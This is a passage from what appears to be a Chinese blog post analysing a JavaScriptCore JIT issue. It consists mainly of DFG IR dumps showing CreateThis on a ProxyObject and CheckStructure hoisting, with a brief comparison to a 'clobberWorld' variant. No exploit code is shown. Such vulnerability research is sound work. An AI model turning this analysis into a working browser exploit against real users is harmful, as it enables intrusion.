W:Stack(-3), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">10:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">11:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc3(G~&lt;Other&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">12:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">13:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc4(H~&lt;Other&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">14:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">15:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc5(I~&lt;Other&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">16:&lt; 1:-&gt; JSConstant(JS|PureInt, Function, Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">17:&lt; 1:-&gt; JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">18:&lt;!0:-&gt; MovHint(Check:Untyped:@17, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">19:&lt; 1:-&gt; SetLocal(Check:Untyped:@17, loc3(J~&lt;Object&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#1, exit: bc#3, ExitValid) predicting OtherObj</span></span><br><span class="line">20:&lt;!0:-&gt; MovHint(Check:Untyped:@17, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#3, ExitValid)</span></span><br><span class="line">21:&lt; 1:-&gt; SetLocal(Check:Untyped:@17, loc4(K~&lt;Object&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#3, exit: bc#6, ExitValid) predicting OtherObj</span></span><br><span class="line">22:&lt;!0:-&gt; CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc<span class="comment">#6, ExitValid)</span></span><br><span class="line">41:&lt;!0:-&gt; InvalidationPoint(MustGen, W:SideState, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">23:&lt;!0:-&gt; GetLocal(Check:Untyped:@0, JS|MustGen|UseAsOther, ProxyObject, this(a), R:Stack(5), bc<span class="comment">#7, ExitValid) predicting ProxyObject</span></span><br><span class="line">24:&lt;!0:-&gt; MovHint(Check:Untyped:@23, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">25:&lt; 1:-&gt; SetLocal(Check:Untyped:@23, loc5(L~&lt;Object&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#7, exit: bc#10, ExitValid) predicting ProxyObject</span></span><br><span class="line">26:&lt; 1:-&gt; CreateThis(Check:Cell:@23, JS|UseAsOther, Final, R:HeapObjectCount,MiscFields, W:HeapObjectCount, Exits, ClobbersExit, bc<span class="comment">#10, ExitValid)</span></span><br><span class="line">27:&lt;!0:-&gt; MovHint(Check:Untyped:@26, MustGen, this, W:SideState, ClobbersExit, bc<span class="comment">#10, ExitInvalid)</span></span><br><span class="line">28:&lt; 1:-&gt; SetLocal(Check:Untyped:@26, IsFlushed, this(M!&lt;Final&gt;/FlushedJSValue), W:Stack(5), bc<span class="comment">#10, exit: bc#15, ExitValid) predicting Final</span></span><br><span class="line">29:&lt;!0:-&gt; GetLocal(Check:Untyped:@1, JS|MustGen|UseAsOther, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#15, ExitValid) predicting Array</span></span><br><span class="line">30:&lt;!0:-&gt; CheckNotEmpty(Check:Untyped:@29, MustGen, Exits, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">31:&lt; 1:-&gt; JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">32:&lt;!0:-&gt; GetLocal(Check:Untyped:@2, JS|MustGen|UseAsOther, NonIntAsdouble, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), bc<span class="comment">#17, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">38:&lt;!0:-&gt; CheckStructure(Check:Cell:@29, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">39:&lt; 1:-&gt; GetButterfly(Check:Cell:@29, Storage|PureInt, R:JSObject_butterfly, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">40:&lt; 1:-&gt; DoubleRep(Check:RealNumber:@32, Double|PureInt, BytecodeDouble, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">33:&lt;!0:-&gt; PutByVal(Check:KnownCell:@29, Check:Int32:@31, Check:DoubleRepReal:@40&lt;Double&gt;, Check:Untyped:@39, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">34:&lt;!0:-&gt; Return(Check:Untyped:@26, MustGen, W:SideState, Exits, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">35:&lt;!0:-&gt; Flush(Check:Untyped:@2, MustGen|IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), W:SideState, bc<span class="comment">#22, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">36:&lt;!0:-&gt; Flush(Check:Untyped:@1, MustGen|IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), W:SideState, bc<span class="comment">#22, ExitValid) predicting Array</span></span><br><span class="line">37:&lt;!0:-&gt; Flush(Check:Untyped:@28, MustGen|IsFlushed, this(M!&lt;Final&gt;/FlushedJSValue), R:Stack(5), W:SideState, bc<span class="comment">#22, ExitValid) predicting Final</span></span><br><span class="line"></span><br><span class="line">States: InvalidBranchDirection, StructuresAreWatched</span><br><span class="line">Vars After: &lt;empty&gt;</span><br><span class="line">Var Links: arg2:@32 arg1:@29 arg0:@28 loc0:@5 loc1:@7 loc2:@9 loc3:@19 loc4:@21 loc5:@25</span><br><span class="line">GC Values:</span><br><span class="line">Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73</span><br><span class="line">Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290</span><br><span class="line">Desired watchpoints:</span><br><span class="line">Watchpoint sets:</span><br><span class="line">Inline watchpoint sets: 0x11cdf1fe0, 0x11cdf0060, 0x11cdf27c0, 0x11cdf0760, 0x11cd701b0, 0x11cdf01b0</span><br><span class="line">Inferred values: 0x11cdd8f00</span><br><span class="line">Buffer views:</span><br><span class="line">Object property conditions:</span><br><span class="line">Inferred types:</span><br><span class="line">Structures:</span><br><span class="line">%Bl:JSLexicalEnvironment = 0x11cdf1f80:[JSLexicalEnvironment, &#123;&#125;, NonArray, Leaf]</span><br><span class="line">%Dy:Array = 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]</span><br><span class="line">%En:Function = 0x11cd70150:[Function, &#123;prototype:100&#125;, NonArray, Proto:0x11cdd0000, Leaf]</span><br><span class="line"></span><br><span class="line">Beginning DFG phase strength reduction.</span><br><span class="line">Before strength reduction:</span><br><span class="line"></span><br><span class="line">DFG <span class="keyword">for</span> assign<span class="comment">#Ei5h05:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]:</span></span><br><span class="line">Fixpoint state: FixpointNotConverged; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive</span><br><span class="line">Arguments <span class="keyword">for</span> block<span class="comment">#0: @0, @1, @2</span></span><br><span class="line">Block <span class="comment">#0 (bc#0): (OSR target)</span></span><br><span class="line">Execution count: 1.000000</span><br><span class="line">Predecessors:</span><br><span class="line">Successors:</span><br><span class="line">Dominated by: <span class="comment">#root #0</span></span><br><span class="line">Dominates: <span class="comment">#0</span></span><br><span class="line">Dominance Frontier:</span><br><span class="line">Iterated Dominance Frontier:</span><br><span class="line">States: StructuresAreWatched, CurrentlyCFAUnreachable</span><br><span class="line">Vars Before: &lt;empty&gt;</span><br><span class="line">Intersected Vars Before: arg2:(DoubleImpureNan|Top|Empty, TOP, TOP) arg1:(DoubleImpureNan|Top|Empty, TOP, TOP) arg0:(DoubleImpureNan|Top|Empty, TOP, TOP) loc0:(DoubleImpureNan|Top|Empty, TOP, TOP) loc1:(DoubleImpureNan|Top|Empty, TOP, TOP) loc2:(DoubleImpureNan|Top|Empty, TOP, TOP) loc3:(DoubleImpureNan|Top|Empty, TOP, TOP) loc4:(DoubleImpureNan|Top|Empty, TOP, TOP) loc5:(DoubleImpureNan|Top|Empty, TOP, TOP) loc6:(DoubleImpureNan|Top|Empty, TOP, TOP) loc7:(DoubleImpureNan|Top|Empty, TOP, TOP)</span><br><span class="line">Var Links: arg2:@2 arg1:@1 arg0:@0</span><br><span class="line">0:&lt; 1:-&gt; SetArgument(this(a), W:SideState, bc<span class="comment">#0, ExitValid) predicting ProxyObject</span></span><br><span class="line">1:&lt; 1:-&gt; SetArgument(IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), W:SideState, bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">42:&lt;!0:-&gt; GetLocal(Check:Untyped:@1, JS|MustGen|PureInt, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">43:&lt;!0:-&gt; CheckStructure(Check:Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">2:&lt; 1:-&gt; SetArgument(IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), W:SideState, bc<span class="comment">#0, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">3:&lt; 1:-&gt; JSConstant(JS|PureInt, Other, Undefined, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">4:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc0, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">5:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc0(D~&lt;Other&gt;/FlushedJSValue), W:Stack(-1), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">6:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc1, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">7:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc1(E~&lt;Other&gt;/FlushedJSValue), W:Stack(-2), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">8:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc2, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">9:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc2(F~&lt;Other&gt;/FlushedJSValue), W:Stack(-3), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">10:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">11:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc3(G~&lt;Other&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">12:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">13:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc4(H~&lt;Other&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">14:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">15:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc5(I~&lt;Other&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">16:&lt; 1:-&gt; JSConstant(JS|PureInt, Function, Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">17:&lt; 1:-&gt; JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">18:&lt;!0:-&gt; MovHint(Check:Untyped:@17, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">19:&lt; 1:-&gt; SetLocal(Check:Untyped:@17, loc3(J~&lt;Object&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#1, exit: bc#3, ExitValid) predicting OtherObj</span></span><br><span class="line">20:&lt;!0:-&gt; MovHint(Check:Untyped:@17, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#3, ExitValid)</span></span><br><span class="line">21:&lt; 1:-&gt; SetLocal(Check:Untyped:@17, loc4(K~&lt;Object&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#3, exit: bc#6, ExitValid) predicting OtherObj</span></span><br><span class="line">22:&lt;!0:-&gt; CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc<span class="comment">#6, ExitValid)</span></span><br><span class="line">41:&lt;!0:-&gt; InvalidationPoint(MustGen, W:SideState, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">23:&lt;!0:-&gt; GetLocal(Check:Untyped:@0, JS|MustGen|UseAsOther, ProxyObject, this(a), R:Stack(5), bc<span class="comment">#7, ExitValid) predicting ProxyObject</span></span><br><span class="line">24:&lt;!0:-&gt; MovHint(Check:Untyped:@23, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">25:&lt; 1:-&gt; SetLocal(Check:Untyped:@23, loc5(L~&lt;Object&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#7, exit: bc#10, ExitValid) predicting ProxyObject</span></span><br><span class="line">26:&lt; 1:-&gt; CreateThis(Check:Cell:@23, JS|UseAsOther, Final, R:HeapObjectCount,MiscFields, W:HeapObjectCount, Exits, ClobbersExit, bc<span class="comment">#10, ExitValid)</span></span><br><span class="line">27:&lt;!0:-&gt; MovHint(Check:Untyped:@26, MustGen, this, W:SideState, ClobbersExit, bc<span class="comment">#10, ExitInvalid)</span></span><br><span class="line">28:&lt; 1:-&gt; SetLocal(Check:Untyped:@26, IsFlushed, this(M!&lt;Final&gt;/FlushedJSValue), W:Stack(5), bc<span class="comment">#10, exit: bc#15, ExitValid) predicting Final</span></span><br><span class="line">29:&lt;!0:-&gt; GetLocal(Check:Untyped:@1, JS|MustGen|UseAsOther, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#15, ExitValid) predicting Array</span></span><br><span class="line">30:&lt;!0:-&gt; CheckNotEmpty(Check:Untyped:@42, MustGen, Exits, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">31:&lt; 1:-&gt; JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">32:&lt;!0:-&gt; GetLocal(Check:Untyped:@2, JS|MustGen|UseAsOther, NonIntAsdouble, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), bc<span class="comment">#17, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">38:&lt;!0:-&gt; CheckStructure(Check:Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">39:&lt; 1:-&gt; GetButterfly(Check:Cell:@42, Storage|PureInt, R:JSObject_butterfly, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">40:&lt; 1:-&gt; DoubleRep(Check:RealNumber:@32, Double|PureInt, BytecodeDouble, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">33:&lt;!0:-&gt; PutByVal(Check:KnownCell:@42, Check:Int32:@31, Check:DoubleRepReal:@40&lt;Double&gt;, Check:Untyped:@39, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">34:&lt;!0:-&gt; Return(Check:Untyped:@26, MustGen, W:SideState, Exits, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">35:&lt;!0:-&gt; Flush(Check:Untyped:@2, MustGen|IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), W:SideState, bc<span class="comment">#22, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">36:&lt;!0:-&gt; Flush(Check:Untyped:@1, MustGen|IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), W:SideState, bc<span class="comment">#22, ExitValid) predicting Array</span></span><br><span class="line">37:&lt;!0:-&gt; Flush(Check:Untyped:@28, MustGen|IsFlushed, this(M!&lt;Final&gt;/FlushedJSValue), R:Stack(5), W:SideState, bc<span class="comment">#22, ExitValid) predicting Final</span></span><br><span class="line"></span><br><span class="line">States: InvalidBranchDirection, StructuresAreWatched</span><br><span class="line">Vars After: &lt;empty&gt;</span><br><span class="line">Var Links: arg2:@32 arg1:@42 arg0:@28 loc0:@5 loc1:@7 loc2:@9 loc3:@19 loc4:@21 loc5:@25</span><br><span class="line">GC Values:</span><br><span class="line">Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73</span><br><span class="line">Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290</span><br><span class="line">Desired watchpoints:</span><br><span class="line">Watchpoint sets:</span><br><span class="line">Inline watchpoint sets: 0x11cdf1fe0, 0x11cdf0060, 0x11cdf27c0, 0x11cdf0760, 0x11cd701b0, 0x11cdf01b0</span><br><span class="line">Inferred values: 0x11cdd8f00</span><br><span class="line">Buffer views:</span><br><span class="line">Object property conditions:</span><br><span class="line">Inferred types:</span><br><span class="line">Structures:</span><br><span class="line">%Bl:JSLexicalEnvironment = 0x11cdf1f80:[JSLexicalEnvironment, &#123;&#125;, NonArray, Leaf]</span><br><span class="line">%Dy:Array = 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]</span><br><span class="line">%En:Function = 0x11cd70150:[Function, &#123;prototype:100&#125;, NonArray, Proto:0x11cdd0000, Leaf]</span><br></pre></td></tr></table></figure>
<p>CheckStructure这个IR有一个专门的提前阶段，叫DFGCheckStructureHoisting。这个过程把42 GetLocal、43 CheckStructure提前。对比clobberWorld版本这个阶段也是发生的。</p>
<p>随后，有：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">Beginning DFG phase constant folding.</span><br><span class="line">Before constant folding:</span><br><span class="line"></span><br><span class="line">DFG <span class="keyword">for</span> assign<span class="comment">#Ei5h05:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]:</span></span><br><span class="line">Fixpoint state: FixpointNotConverged; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive</span><br><span class="line">Arguments <span class="keyword">for</span> block<span class="comment">#0: @0, @1, @2</span></span><br><span class="line"></span><br><span class="line">Block <span class="comment">#0 (bc#0): (OSR target)</span></span><br><span class="line">Execution count: 1.000000</span><br><span class="line">Predecessors:</span><br><span class="line">Successors:</span><br><span class="line">Dominated by: <span class="comment">#root #0</span></span><br><span class="line">Dominates: <span class="comment">#0</span></span><br><span class="line">Dominance Frontier:</span><br><span class="line">Iterated Dominance Frontier:</span><br><span class="line">States: StructuresAreWatched</span><br><span class="line">Vars Before: arg2:(Top|Empty, TOP, TOP) arg1:(Cell|Empty, TOP, TOP) arg0:(Cell|Empty, TOP, TOP)</span><br><span class="line">Intersected Vars Before: arg2:(Top|Empty, TOP, TOP) arg1:(Cell|Empty, TOP, TOP) arg0:(Cell|Empty, TOP, TOP)</span><br><span class="line">Var Links: arg2:@2 arg1:@1 arg0:@0</span><br><span class="line">0:&lt; 1:-&gt; SetArgument(this(a), W:SideState, bc<span class="comment">#0, ExitValid) predicting ProxyObject</span></span><br><span class="line">1:&lt; 1:-&gt; SetArgument(IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), W:SideState, bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">42:&lt;!0:-&gt; GetLocal(Untyped:@1, JS|MustGen|PureInt, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">43:&lt;!0:-&gt; CheckStructure(Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">2:&lt; 1:-&gt; SetArgument(IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), W:SideState, bc<span class="comment">#0, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">3:&lt; 1:-&gt; JSConstant(JS|PureInt, Other, Undefined, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">4:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc0, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">5:&lt; 1:-&gt; SetLocal(Untyped:@3, loc0(D~&lt;Other&gt;/FlushedJSValue), W:Stack(-1), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">6:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc1, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">7:&lt; 1:-&gt; SetLocal(Untyped:@3, loc1(E~&lt;Other&gt;/FlushedJSValue), W:Stack(-2), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">8:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc2, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">9:&lt; 1:-&gt; SetLocal(Untyped:@3, loc2(F~&lt;Other&gt;/FlushedJSValue), W:Stack(-3), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">10:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">11:&lt; 1:-&gt; SetLocal(Untyped:@3, loc3(G~&lt;Other&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">12:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">13:&lt; 1:-&gt; SetLocal(Untyped:@3, loc4(H~&lt;Other&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">14:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">15:&lt; 1:-&gt; SetLocal(Untyped:@3, loc5(I~&lt;Other&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">16:&lt; 1:-&gt; JSConstant(JS|PureInt, Function, Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">17:&lt; 1:-&gt; JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">18:&lt;!0:-&gt; MovHint(Untyped:@17, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">19:&lt; 1:-&gt; SetLocal(Untyped:@17, loc3(J~&lt;Object&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#1, exit: bc#3, ExitValid) predicting OtherObj</span></span><br><span class="line">20:&lt;!0:-&gt; MovHint(Untyped:@17, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#3, ExitValid)</span></span><br><span class="line">21:&lt; 1:-&gt; SetLocal(Untyped:@17, loc4(K~&lt;Object&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#3, exit: bc#6, ExitValid) predicting OtherObj</span></span><br><span class="line">22:&lt;!0:-&gt; CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc<span class="comment">#6, ExitValid)</span></span><br><span class="line">41:&lt;!0:-&gt; InvalidationPoint(MustGen, W:SideState, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">23:&lt;!0:-&gt; GetLocal(Untyped:@0, JS|MustGen|UseAsOther, ProxyObject, this(a), R:Stack(5), bc<span class="comment">#7, ExitValid) predicting 